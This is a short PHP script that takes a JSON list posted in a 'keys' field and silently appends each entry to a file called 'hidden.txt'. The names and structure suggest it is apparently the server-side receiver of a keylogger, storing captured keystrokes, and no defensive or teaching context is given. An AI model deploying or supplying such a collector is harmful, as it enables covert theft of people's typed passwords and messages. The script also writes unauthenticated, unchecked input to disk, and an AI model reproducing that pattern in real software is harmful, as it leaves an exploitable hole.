<?php
// open or create hidden.txt
$file = fopen("hidden.txt", "a+");

// decode the JSON string 
$keys = json_decode($_POST['keys']);

// loop through each key 
foreach ($keys as $k=>$v) {
    // write each key to the file
    fwrite($file, $v . PHP_EOL);
}

// close the file
fclose($file);
